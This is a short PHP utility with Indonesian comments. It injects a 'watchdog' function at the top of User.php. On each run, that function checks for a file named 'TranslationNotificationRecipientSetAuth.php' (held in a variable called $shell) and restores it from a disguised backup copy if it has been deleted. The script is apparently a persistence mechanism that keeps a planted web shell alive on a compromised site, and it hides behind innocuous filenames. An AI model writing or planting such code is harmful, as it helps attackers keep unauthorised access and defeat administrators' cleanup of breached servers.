<?php

// Path file yang akan disisipkan kode watchdog
$filePath = 'User.php';

// Kode watchdog yang akan disisipkan
$watchdogCode = <<<'EOD'
<?php

// Watchdog script otomatis
function watchdog() {
    $shell = "TranslationNotificationRecipientSetAuth.php";  // Lokasi file yang perlu ada
    $backup = "UserProfiles/FollowResultData.php";           // Lokasi file backup

    // Cek jika file shell tidak ada
    if (!file_exists($shell)) {
        // Jika file backup ada, salin ke lokasi shell
        if (file_exists($backup)) {
            // Coba salin file backup ke lokasi shell
            if (copy($backup, $shell)) {
                // Ubah timestamp file untuk menandai bahwa file sudah ada
                touch($shell); 
                error_log("File backup berhasil disalin ke $shell");
            } else {
                // Log jika penyalinan gagal
                error_log("Gagal menyalin file backup ke $shell");
            }
        } else {
            // Log jika file backup tidak ditemukan
            error_log("File backup tidak ditemukan: $backup");
        }
    }
}

// Panggil watchdog di awal
watchdog();

?>
EOD;

// Mengecek apakah file ada
if (file_exists($filePath)) {
    // Membaca seluruh isi file
    $fileContent = file_get_contents($filePath);

    // Menyisipkan kode watchdog di bagian paling atas
    $newContent = $watchdogCode . "\n" . $fileContent;

    // Menulis ulang file dengan kode watchdog yang disisipkan
    file_put_contents($filePath, $newContent);

    echo "Watchdog telah disisipkan di file $filePath.";
} else {
    echo "File $filePath tidak ditemukan.";
}

?>
